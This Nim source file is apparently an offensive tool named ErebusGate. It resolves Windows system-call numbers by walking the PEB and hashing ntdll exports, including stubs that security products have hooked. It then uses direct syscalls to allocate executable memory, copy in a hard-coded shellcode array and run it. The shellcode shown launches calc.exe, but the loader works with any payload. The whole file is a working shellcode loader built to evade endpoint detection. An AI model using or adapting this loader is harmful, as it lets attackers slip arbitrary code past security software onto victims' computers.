#[
    Original author:Haunted Banshee 
    License: BSD 3-Clause
]#

include custom
import strutils
import os
import strformat

{.passC:"-masm=intel".}

var syscall*  : WORD
type
    HG_TABLE_ENTRY* = object
        pAddress*    : PVOID
        dwHash*      : uint64
        wSysCall*    : WORD
    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

proc djb2_hash*(pFuncName : string) : uint64 =

    var hash : uint64 = 0x5382

    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))

    return hash

proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
    return pCurrentModule.FullDllName.Buffer

proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =

    let 
        pImageBase : PVOID              = pCurrentModule.DLLBase
        pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false

    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false

    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)

    return true

proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =

    var 
        cx : DWORD = 0
        numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
        DOWN = 32
        UP = -32
    let 
        pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

    while cx < numFuncs:    
        var 
            pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
            pFuncName       : string    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash        : uint64    = djb2_hash(pFuncName)
            funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:

            tableEntry.pAddress = pFuncAddr
            # Not hooked API
            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
                return true
            # Classic hook API 
            # Check the the first byte is 0xe9
            elif cast[PBYTE](cast[ByteAddress](pFuncAddr))[] == 0xE9:
                for idx in countup(1,500):
                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
                        return true
                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
                        return true 
            # Tartarus gate from Nim
            # Check the the first three is 0xe9
            elif cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 )[] == 0xE9:
                for idx in countup(1,500):
                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
                        return true
                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
                        return true                
        inc cx
    return false

proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm """
        mov rax, qword ptr gs:[0x60]
        ret
    """

proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
    var 
        currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
        moduleName      : string
        pExportTable    : PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:

        moduleName = $moduleToBuffer(currModule)

        if moduleName.len() == 0 or moduleName in paramStr(0):            
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
            continue

        if not getExportTable(currModule, pExportTable):
            echo "[-] Failed to get export table..."
            return false
 
        if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
            return true
        
        currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
    
    let currentPeb  : PPEB = GetPEBAsm64()
       
    if not searchLoadedModules(currentPeb, tableEntry):
        return false

    return true

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        nop
        mov r10, rcx
        nop
        mov eax, `syscall`
        nop
        syscall
        ret
    """

proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm """
        nop
        mov r10, rcx
        nop
        mov eax, `syscall`
        nop
        syscall
        ret
    """

when isMainModule:
    
    when defined(amd64):
        
        var shellcode: array[287, byte] = [
        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
        0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,
        0x65,0x00]

        if paramCount() != 0:
            echo fmt"[!] Usage: ErebusGate.exe"
        else:
            var 
                funcHash        : uint64            = djb2_hash("NtAllocateVirtualMemory")
                example         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : funcHash)
                status          : NTSTATUS          = 0x00000000
                buffer          : LPVOID            = NULL
                dataSz          : SIZE_T            = cast[SIZE_T](shellcode.len)

            if getSyscall(example):
                
                echo fmt"[+] NtAllocateVirtualMemory"
                echo fmt"    Opcode  : {toHex(example.wSyscall)}"
                echo fmt"    Address : 0x{toHex(cast[ByteAddress](example.pAddress))}"
                echo fmt"    Hash    : {toHex(example.dwHash)}"

                echo fmt"[+] Calling NtAllocateVirtualMemory"

                
                syscall = example.wSysCall
                status = NtAllocateVirtualMemory(cast[HANDLE](-1), buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                
                echo fmt"[i] Status: 0x{toHex(status)}"
                if not NT_SUCCESS(status):
                    echo fmt"[-] Failed to allocate memory."
                else:
                    echo fmt"[+] Allocated a page of memory with RWX perms at 0x{toHex(cast[ByteAddress](buffer))}"
            else:
                echo fmt"[-] Failed to find opcode for NtAllocateVirtualMemory"

            funcHash = djb2_hash("NtWriteVirtualMemory")
            example = HG_TABLE_ENTRY(dwHash : funcHash)
            if getSyscall(example):
                
                echo fmt"[+] NtWriteVirtualMemory"
                echo fmt"    Opcode  : {toHex(example.wSyscall)}"
                echo fmt"    Address : 0x{toHex(cast[ByteAddress](example.pAddress))}"
                echo fmt"    Hash    : {toHex(example.dwHash)}"

                echo fmt"[+] Calling NtWriteVirtualMemory"

                var bytesWritten: SIZE_T
                syscall = example.wSysCall
                status = NtWriteVirtualMemory(cast[HANDLE](-1), buffer, unsafeAddr shellcode, dataSz, addr bytesWritten)
                
                echo fmt"[i] Status: 0x{toHex(status)}"
                if not NT_SUCCESS(status):
                    echo fmt"[-] Failed to allocate memory."
                else:
                    echo fmt"[+] Wrote bytes at 0x{toHex(cast[ByteAddress](buffer))}"
            else:
                echo fmt"[-] Failed to find opcode for NtWriteVirtualMemory"

            let a = cast[proc(){.nimcall.}](buffer)
            a()    
